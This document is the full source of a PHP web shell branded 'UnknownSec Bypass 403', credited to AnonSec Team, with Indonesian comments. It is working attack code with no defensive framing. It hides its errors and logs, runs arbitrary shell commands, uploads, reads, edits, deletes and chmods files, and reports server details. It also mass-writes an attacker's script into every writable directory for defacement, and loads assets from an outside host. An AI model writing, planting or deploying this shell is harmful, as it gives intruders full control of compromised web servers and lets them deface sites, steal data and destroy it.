 <?php
/*	~ Mau recode? izin dulu, recode ga izin itu ga keren ajg
	~ V.02
	~ Thanks to all mem AnonSec Team and all friend.
	~ Untuk beberapa tools gw ambil dari indoxploit, karena tidak semuanya gw otakin sendiri. 
*/
set_time_limit(0);
error_reporting(0);
@ini_set('error_log',null);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);

$â–› = 'UnknownSec';
$â–˜ = "<style>table{display:none;}</style>";

if(isset($_GET['option']) && $_POST['opt'] == 'download'){
	header('Content-type: text/plain');
	header('Content-Disposition: attachment; filename="'.$_POST['name'].'"');
echo(file_get_contents($_POST['path']));
exit();
}

if(get_magic_quotes_gpc()){
	foreach($_POST as $key=>$value){
		$_POST[$key] = stripslashes($value);
	}
}

function â–Ÿ($dir,$p) {
if (isset($_GET['path'])) {
	$â–š = $_GET['path'];
} else {
	$â–š = getcwd();
}
if (is_writable($â–š)) {
	return "<font color='green'>".$p."</font>";
} else {
	return "<font color='red'>".$p."</font>";
	}
}

function dc($dir,$p) {
if (isset($_GET['path'])) {
	$â–š = $_GET['path'];
} else {
	$â–š = getcwd();
}
if (is_writable($â–š)) {
	return "<font color='green'>".$p."</font>";
} else {
	return "<font color='red'>".$p."</font>";
	}
}

function ip() {
	$ipas = '';
if (getenv('HTTP_CLIENT_IP'))
	$ipas = getenv('HTTP_CLIENT_IP');
else if(getenv('HTTP_X_FORWARDED_FOR'))
	$ipas = getenv('HTTP_X_FORWARDED_FOR');
else if(getenv('HTTP_X_FORWARDED'))
	$ipas = getenv('HTTP_X_FORWARDED');
else if(getenv('HTTP_FORWARDED_FOR'))
	$ipas = getenv('HTTP_FORWARDED_FOR');
else if(getenv('HTTP_FORWARDED'))
	$ipas = getenv('HTTP_FORWARDED');
else if(getenv('REMOTE_ADDR'))
	$ipas = getenv('REMOTE_ADDR');
else
	$ipas = 'IP tidak dikenali';
return $ipas;
}

function ekse() { 
	$cmd = "whoami";
	$return = "";
	$output = "";
	$methodArray = array();
	//exec()
	$return = ""; $output = "";
	exec($cmd, $output, $return);
	if (strlen($output[0]) > 0 && $return == 0) {
		$methodArray[] = "exec";
	}
	//shell_exec()
	$return = ""; $output = "";
	$output = shell_exec($cmd);
	if (strlen($output) > 0) {
		$methodArray[] = "shell_exec";
	}
	return $methodArray;
}
function ekseCMD($cmd, $method) {
	if ($method == "") {
		ob_start();
		$methodArray = ekse();
		ob_end_clean();
		if (is_array($methodArray)) {
			$method = $methodArray[0];
		}
	}
	switch ($method) {
		case "exec":
			exec($cmd, $output);
			var_dump($output);
			break;
		case "shell_exec":
			echo shell_exec($cmd);
			break;
	}
}
$cmd = htmlspecialchars($_POST["cmd"]);
$method = htmlspecialchars($_POST["execCMD"]);
	
function p($file){
$p = fileperms($file);
if (($p & 0xC000) == 0xC000) {
$i = 's';
} elseif (($p & 0xA000) == 0xA000) {
$i = 'l';
} elseif (($p & 0x8000) == 0x8000) {
$i = '-';
} elseif (($p & 0x6000) == 0x6000) {
$i = 'b';
} elseif (($p & 0x4000) == 0x4000) {
$i = 'd';
} elseif (($p & 0x2000) == 0x2000) {
$i = 'c';
} elseif (($p & 0x1000) == 0x1000) {
$i = 'p';
} else {
$i = 'u';
	}
$i .= (($p & 0x0100) ? 'r' : '-');
$i .= (($p & 0x0080) ? 'w' : '-');
$i .= (($p & 0x0040) ?
(($p & 0x0800) ? 's' : 'x' ) :
(($p & 0x0800) ? 'S' : '-'));
$i .= (($p & 0x0020) ? 'r' : '-');
$i .= (($p & 0x0010) ? 'w' : '-');
$i .= (($p & 0x0008) ?
(($p & 0x0400) ? 's' : 'x' ) :
(($p & 0x0400) ? 'S' : '-'));
$i .= (($p & 0x0004) ? 'r' : '-');
$i .= (($p & 0x0002) ? 'w' : '-');
$i .= (($p & 0x0001) ?
(($p & 0x0200) ? 't' : 'x' ) :
(($p & 0x0200) ? 'T' : '-'));
return $i;
exit();
	}
echo "
<!DOCTYPE HTML>
<html>
	<head>
		<meta name='author' content='$â–›'>
		<meta name='robots' content='NOINDEX, NOFOLLOW'>
		<title>".$_SERVER['HTTP_HOST']." - $â–› 403</title>
		<meta name='viewport' content='width=device-width, initial-scale=0.70, user-scalable=no'>
		<link rel='stylesheet' href='//unknownsec.ftp.sh/main/style.css'>
		<script src='//maxcdn.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js'></script>
		<script src='//cdnjs.cloudflare.com/ajax/libs/limonte-sweetalert2/7.33.1/sweetalert2.min.js'></script>
	</head>
<body class='bg-secondary text-light'>
<div class='container-fluid'>
	<div class='py-3' id='main'>
		<div class='box shadow bg-dark p-4 rounded-3'>
		<a class='text-decoration-none text-light' href='".$_SERVER['PHP_SELF']."'><h4>$â–› Bypass <i class='bi bi-bug-fill'></i> 403</h4></a>";
		if(isset($_GET['path'])){
			$path = $_GET['path'];
		}else{
			$path = getcwd();
	}
			$path = str_replace('\\','/',$path);
			$paths = explode('/',$path);
		foreach($paths as $id=>$pat){
		if($pat == '' && $id == 0){
			$a = true;
			echo '<i class="bi bi-hdd-rack"></i> : <a class="text-decoration-none text-light" href="?path=/">/</a>';
		continue;
	}
		if($pat == '') continue;
			echo '<a class="text-decoration-none" href="?path=';
		for($i=0;$i<=$id;$i++){
			echo "$paths[$i]";
		if($i != $id) echo "/";
	}
		echo '">'.$pat.'</a>/';
	}
		echo " [ ".â–Ÿ($path, p($path))." ]";
echo "
<div class='dropdown'>
	<button class='btn btn-outline-light dropdown-toggle btn-sm' type='button' id='dropdownMenuButton' data-toggle='dropdown' aria-haspopup='true' aria-expanded='false'><i class='bi bi-menu-down'></i>&nbsp;Menu</button>
	<div class='dropdown-menu'>
		<a class='dropdown-item' href='?path=$path&dir=$path&id=upload'><i class='bi bi-upload'></i> Upload</a>
		<a class='dropdown-item' href='?path=$path&dir=$path&id=depes'><i class='bi bi-exclamation-diamond'></i> Mass depes</a>
		<a class='dropdown-item' href='?path=$path&dir=$path&id=delete'><i class='bi bi-trash'></i> Mass delete</a>
		<a class='dropdown-item' href='?path=$path&dir=$path&id=cmd'><i class='bi bi-terminal'></i> Terminal</a>
		<a class='dropdown-item' href='?path=$path&dir=$path&id=info'><i class='bi bi-info-circle'></i> Info server</a>
		<a class='dropdown-item' href='?path=$path&dir=$path&id=about'><i class='bi bi-info'></i> About</a></h5>
	</div>
</div>";
// tools nya
if(isset($_GET['dir'])) {
	$dir = $_GET['dir'];
	chdir($dir);
} else {
	$dir = getcwd();
}
$dir = str_replace("\\","/",$dir);
$scdir = explode("/", $dir);	
	for($i = 0; $i <= $c_dir; $i++) {
		$scdir[$i];
		if($i != $c_dir) {
		}
elseif($_GET['id'] == 'depes'){
	function mass_kabeh($dir,$namafile,$isi_script) {
	if(is_writable($dir)) {
		$dira = scandir($dir);
		foreach($dira as $dirb) {
			$dirc = "$dir/$dirb";
			$â–š = $dirc.'/'.$namafile;
			if($dirb === '.') {
				file_put_contents($â–š, $isi_script);
			} elseif($dirb === '..') {
				file_put_contents($â–š, $isi_script);
			} else {
				if(is_dir($dirc)) {
					if(is_writable($dirc)) {
						echo "[<font color=green>success</font>] $â–š<br>";
						file_put_contents($â–š, $isi_script);
						$â–Ÿ = mass_kabeh($dirc,$namafile,$isi_script);
					}
				}
			}
		}
	}
}
function mass_biasa($dir,$namafile,$isi_script) {
	if(is_writable($dir)) {
		$dira = scandir($dir);
		foreach($dira as $dirb) {
			$dirc = "$dir/$dirb";
			$â–š = $dirc.'/'.$namafile;
			if($dirb === '.') {
				file_put_contents($â–š, $isi_script);
			} elseif($dirb === '..') {
				file_put_contents($â–š, $isi_script);
			} else {
				if(is_dir($dirc)) {
					if(is_writable($dirc)) {
						echo "[<font color=green>success</font>] $dirb/$namafile<br>";
						file_put_contents($â–š, $isi_script);
					}
				}
			}
		}
	}
}
if($_POST['start']) {
	if($_POST['tipe'] == 'massal') {
		echo "<div style='margin: 5px auto; padding: 5px'>";
	mass_kabeh($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
		echo "</div>";
	} elseif($_POST['tipe'] == 'biasa') {
		echo "<div style='margin: 5px auto; padding: 5px'>";
	mass_biasa($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
		echo "</div>";
	}
} else {
echo "<br />$â–˜
<form method='post'>
	<b>Tipe:</b><br>
<div class='custom-control custom-switch'>
	<input type='checkbox' id='customSwitch' class='custom-control-input' name='tipe' value='biasa'>
	<label class='custom-control-label' for='customSwitch'>Biasa</label>
</div>
<div class='custom-control custom-switch'>
	<input type='checkbox' id='customSwitch1' class='custom-control-input' name='tipe' value='massal'>
	<label class='custom-control-label' for='customSwitch1'>Massal</label>
</div>
	<b><i class='bi bi-folder'></i> Lokasi:</b>
	<input class='form-control' type='text' name='d_dir' value='$dir' height='10'>
	<b><i class='bi bi-file-earmark'></i> File name:</b>
	<input class='form-control' type='text' name='d_file' placeholder='name file' height='10'>
	<b><i class='bi bi-file-earmark'></i> Your script:</b>
	<textarea class='form-control' rows='7' name='script' placeholder='your secript here'></textarea><br />
	<input type='submit' name='start' value='Go' class='btn btn-outline-light'>
</form>";
	}
}
elseif($_GET['id'] == 'info'){
$disfunc = @ini_get("disable_functions");
if (empty($disfunc)) {
	$disfc = "<font color=green>NONE</font>";
} else {
	$disfc = "<font color=red>$disfunc</font>";
}
if(!function_exists('posix_getegid')) {
	$user = @get_current_user();
	$uid = @getmyuid();
	$gid = @getmygid();
	$group = "?";
} else {
	$uid = @posix_getpwuid(posix_geteuid());
	$gid = @posix_getgrgid(posix_getegid());
	$user = $uid['name'];
	$uid = $uid['uid'];
	$group = $gid['name'];
	$gid = $gid['gid'];
}
$sm = (@ini_get(strtolower("safe_mode")) == 'on') ? "<font color=red>ON</font>" : "<font color=green>OFF</font>";
echo '<br />'.$â–˜.'
<div class="container">
	<div class="card text-dark">
		<div class="card-header">';
echo "<b>Uname: </b><font color=green>".php_uname()."</font><br />";
echo "<b>Software: </b><font color=green>".$_SERVER['SERVER_SOFTWARE']."</font><br />";
echo "<b>PHP version: </b><font color=green>".PHP_VERSION."</font> <b>PHP os:</b> <font color=green>".PHP_OS."</font><br />";
echo "<b>Server Ip: </b><font color=green>".gethostbyname($_SERVER['HTTP_HOST'])."</font><br />";
echo "<b>Your Ip: </b><font color=green>".ip()."</font><br />";
echo "<b>User: </b><font color=green>$user</font> ($uid) | <b>Group:</b> <font color=green>$group</font> ($gid)<br />";
echo "<b>Safe Mode: </b>$sm<br />";
echo "<kbd>Disable Function:</kbd><pre>$disfc</pre>";
	echo '</div>
	</div>
</div>';
}
elseif($_GET['id'] == 'about'){
echo '<br />'.$â–˜.'
<div class="container">
	<div class="card text-dark">
		<div class="card-header">';
echo "<img alt='AnonSec Team' class='img-thumbnail rounded mx-auto d-block' src='//unknownsec.ftp.sh/AnonSec.jpg' width='150px'>";
echo "<b>- About Me -</b><br />";
echo "Thanks bre dah pake shell nya, jika ada yang error silahkan hubungi email di bawah.<br />Greetz : <a href=''>{ AnonSec Team } - And You</a><br />My email: <a href='mailto:unknownsec1337@gmail.com'>unknownsec1337@gmail.com</a>";
	echo '</div>
	</div>
</div>';
}
elseif($_GET['id'] == 'cmd') {
echo "$â–˜<br>
<form method='POST'>
<div class='input-group mb-3'>
	<input class='form-control' type='text' name='cmd' value='$cmd'>
	<select class='bg-dark text-light form-control' name='execCMD'>
		<option>$method</option>";
ob_start();
	$methodArray = ekse();
	ob_end_clean();
foreach ($methodArray as $value) {
	echo "<option>$value</option>";
	}		
echo '</select>
	</div>
</form>';
if($cmd == "") {
echo "
<div class='card text-dark'>
	<div class='card-header'>
		<pre>";
		ekseCMD("whoami", $method);
		echo '</pre>
	</div>
</div>';
}else {
echo "
<div class='card text-dark'>
	<div class='card-header'>
		<pre><kbd>~$&ensp;".$cmd."</kbd><br>";
		ekseCMD($cmd, $method);
		echo "</pre>
	</div>
</div>";
}
}
elseif($_GET['id'] == 'upload'){
echo '<br />'.$â–˜.'
<form action="" method="post" enctype="multipart/form-data">
	<div class="input-group mb-3 text-center">
		<input type="file" class="form-control form-control-sm" name="file">
		<button type="submit" class="btn btn-outline-light btn-sm">Submit</button>
	</div>
</form>';
if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo '
<script type="text/javascript">
Swal.fire(
  "Success",
  "Success upload",
  "success"
).then((btnClick) => {if(btnClick){document.location.href="?path='.$path.'"}})</script>
';
}else{
echo '
<script type="text/javascript">
Swal.fire(
  "Opsss",
  "Failed upload",
  "error"
).then((btnClick) => {if(btnClick){document.location.href="?path='.$path.'"}})</script>
';
}
	}
}
elseif($_GET['id'] == 'delete'){
function hapus_massal($dir,$namafile) {
	if(is_writable($dir)) {
		$dira = scandir($dir);
		foreach($dira as $dirb) {
			$dirc = "$dir/$dirb";
			$â–š = $dirc.'/'.$namafile;
			if($dirb === '.') {
				if(file_exists("$dir/$namafile")) {
					unlink("$dir/$namafile");
				}
			} elseif($dirb === '..') {
				if(file_exists("".dirname($dir)."/$namafile")) {
					unlink("".dirname($dir)."/$namafile");
				}
			} else {
				if(is_dir($dirc)) {
					if(is_writable($dirc)) {
						if(file_exists($â–š)) {
							echo "[<font color=green>deleted</font>] $â–š<br>";
							unlink($â–š);
							$â–Ÿ = hapus_massal($dirc,$namafile);
						}
					}
				}
			}
		}
	}
}
if($_POST['start']) {
echo "<div style='margin: 5px auto; padding: 5px'>";
	hapus_massal($_POST['d_dir'], $_POST['d_file']);
echo "</div>";
} else {
echo "<br />$â–˜
<form method='post'>
	<b><i class='bi bi-folder'></i> Lokasi:</b>
	<input class='form-control' type='text' name='d_dir' value='$dir' height='10'>
	<b><i class='bi bi-file-earmark'></i> File name:</b>
	<div class='input-group mb-3'>
	<input class='form-control' type='text' name='d_file' placeholder='name file' height='10'><br>
	<div class='input-group-append'>
	<input class='btn btn-outline-light' type='submit' name='start' value='Go'>
</form>
	</div>
	</div>";
		}
	}
}
// akhir tools
if(isset($_GET['filesrc'])){
echo "<br><b>name : </b>".basename($_GET['filesrc']);"</br>";
echo '<textarea class="form-control" rows="7" readonly> '.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</textarea><br />';
}
elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo '<br><b>name : </b>'.basename($_POST['path']);'</br>';
//Chmod
if($_POST['opt'] == 'chmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['path'],$_POST['perm'])){
echo '
<script type="text/javascript">
Swal.fire(
  "Success",
  "Success Change Permission",
  "success"
).then((btnClick) => {if(btnClick){document.location.href="?path='.$path.'"}})</script>
';
}else{
echo '
<script type="text/javascript">
Swal.fire(
  "Opsss",
  "Failed change permission",
  "error"
).then((btnClick) => {if(btnClick){document.location.href="?path='.$path.'"}})</script>
';
}
}
echo '<form method="POST">
	<div class="input-group mb-3">
<input class="form-control" name="perm" type="text" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'"/>
	<input class="form-control" type="hidden" name="path" value="'.$_POST['path'].'">
		<input class="form-control" type="hidden" name="opt" value="chmod">
		<div class="input-group-append">
	<input class="btn btn-outline-light" type="submit" value="Go"/>
	</form>
	</div>
</div>';
}
//rename folder
elseif($_GET['opt'] == 'btw'){
	$cwd = getcwd();
	echo '<form action="?option&path='.$cwd.'&opt=delete&type=buat" method="POST">
	<div class="input-group mb-3">
<input class="form-control" name="name" type="text" value="Folder"/>
	<input class="form-control" type="hidden" name="path" value="'.$cwd.'">
		<input class="form-control" type="hidden" name="opt" value="delete">
		<div class="input-group-append">
	<input class="btn btn-outline-light" type="submit" value="Go"/>
	</form>
	</div>
</div>';
}
//rename file
elseif($_POST['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo '
<script type="text/javascript">
Swal.fire(
  "Success",
  "Success change name",
  "success"
).then((btnClick) => {if(btnClick){document.location.href="?path='.$path.'"}})</script>
';
}else{
echo '
<script type="text/javascript">
Swal.fire(
  "Opsss",
  "Failed change name",
  "error"
).then((btnClick) => {if(btnClick){document.location.href="?path='.$path.'"}})</script>
';
}
$_POST['name'] = $_POST['newname'];
}
echo '<form method="POST">
	<div class="input-group mb-3">
<input class="form-control" name="newname" type="text" value="'.$_POST['name'].'" />
	<input class="form-control" type="hidden" name="path" value="'.$_POST['path'].'">
		<input class="form-control" type="hidden" name="opt" value="rename">
		<div class="input-group-append">
	<input class="btn btn-outline-light" type="submit" value="Go"/>
	</form>
	</div>
</div>';
}
//edit file
elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '
<script type="text/javascript">
Swal.fire(
  "Success",
  "Edit file Success",
  "success"
).then((btnClick) => {if(btnClick){document.location.href="?path='.$path.'"}})</script>
';
}else{
echo '
<script type="text/javascript">
Swal.fire(
  "Opsss",
  "Failed edit file",
  "error"
).then((btnClick) => {if(btnClick){document.location.href="?path='.$path.'"}})</script>
';
}
fclose($fp);
}
echo '<form method="POST">
<textarea class="form-control" rows="7" name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
	<input class="form-control" type="hidden" name="path" value="'.$_POST['path'].'">
		<input class="form-control" type="hidden" name="opt" value="edit">
	<input class="btn btn-outline-light" type="submit" value="Go"/>
</form><br />';
	}
}else{
//delete dir
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '
<script type="text/javascript">
Swal.fire(
  "Success",
  "Success delete dir",
  "success"
).then((btnClick) => {if(btnClick){document.location.href="?path='.$path.'"}})</script>
';
}else{
echo '
<script type="text/javascript">
Swal.fire(
  "Opsss",
  "Failed delete dir",
  "error"
).then((btnClick) => {if(btnClick){document.location.href="?path='.$path.'"}})</script>
';
}
}
//delete file
elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
echo '
<script type="text/javascript">
Swal.fire(
  "Success",
  "Success delete file",
  "success"
).then((btnClick) => {if(btnClick){document.location.href="?path='.$path.'"}})</script>
';
}else{
echo '
<script type="text/javascript">
Swal.fire(
  "Opsss",
  "Failed delete file",
  "error"
).then((btnClick) => {if(btnClick){document.location.href="?path='.$path.'"}})</script>
';
}
	}
}
echo '</center>';
$scandir = scandir($path);
$pa = getcwd();
echo '<div class="table-responsive">
<table class="table table-hover table-dark text-light">
<thead>
<tr>
	<td class="text-center">Name</td>
		<td class="text-center">Last edit</td>
		<td class="text-center">Size</td>
		<td class="text-center">Permission</td>
	<td class="text-center">Options</td>
</tr>
</thead>
<tbody class="text-nowrap">';
foreach($scandir as $dir){
$dt = date("Y-m-d", filemtime("$path/$dir"));
if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
	echo "
	<tr>
	<td><i class='bi bi-folder-fill'></i><a class='text-decoration-none text-secondary' href=\"?path=$path/$dir\">$dir</a></td>
	<td><center>$dt</center></td>
	<td><center>DIR</center></td>
	<td><center>";
if(is_writable("$path/$dir")) echo '<font color="green">';
elseif(!is_readable("$path/$dir")) echo '<font color="red">';
	echo p("$path/$dir");
if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';
	echo "</center></td>
	<td>
<form method=\"POST\" action=\"?option&path=$path\">
<div class='input-group mb-3 text-center'>
<select class=\"form-select form-select-sm\" name=\"opt\">
	<option selected disabled>Select</option>
	<option value=\"delete\">Delete</option>
	<option value=\"chmod\">Chmod</option>
	<option value=\"rename\">Rename</option>
</select>
	<input type=\"hidden\" name=\"type\" value=\"dir\">
<input type=\"hidden\" name=\"name\" value=\"$dir\">
	<input type=\"hidden\" name=\"path\" value=\"$path/$dir\">
		<input class=\"btn btn-outline-light btn-sm\" type=\"submit\" value=\"Go\"/>
	</form>
</div>
</td>
</tr>";
}
foreach($scandir as $file){
	$ft = date("Y-m-d", filemtime("$path/$file"));
	if(!is_file($path.'/'.$file)) continue;
	$s = filesize($path.'/'.$file)/1024;
	$s = round($s,3);
	if($s >= 1024){
		$s = round($s/1024,2).' MB';
	}else{
		$s = $s.' KB';
	}
echo "
	<tr>
	<td><i class='bi bi-file-earmark-code-fill'></i><a class='text-decoration-none text-secondary' href=\"?filesrc=$path/$file&path=$path\">$file</a></td>
	<td><center>$ft</center></td>
	<td><center>$s</center></td>
	<td><center>";
if(is_writable("$path/$file")) echo '<font color="green">';
elseif(!is_readable("$path/$file")) echo '<font color="red">';
	echo p("$path/$file");
if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';
	echo "</center></td>
	<td>
<form method=\"POST\" action=\"?option&path=$path\">
<div class='input-group mb-3 text-center'>
<select class=\"form-select form-select-sm\"name=\"opt\">
	<option selected disabled>Select</option>
		<option value=\"delete\">Delete</option>
		<option value=\"edit\">Edit</option>
		<option value=\"rename\">Rename</option>
		<option value=\"chmod\">Chmod</option>
	<option value=\"download\">Download</option>
</select>
<input type=\"hidden\" name=\"type\" value=\"file\">
	<input type=\"hidden\" name=\"name\" value=\"$file\">
		<input type=\"hidden\" name=\"path\" value=\"$path/$file\">
		<input class=\"btn btn-outline-light btn-sm\" type=\"submit\" value=\"Go\"/>
	</form>
</div>
</td>
</tr>";
	}
}
echo "
</tbody>
</table>
<div class='text-center'>
	<kbd>Copyright &copy; ".date("Y")." - $â–›</kbd>
</div>
	</div>
		</div>
	</div>
</div>
<script src='//code.jquery.com/jquery-3.3.1.slim.min.js'></script>
<script src='//cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js'></script>
<script src='//stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js'></script>
</body>
</html>";
?>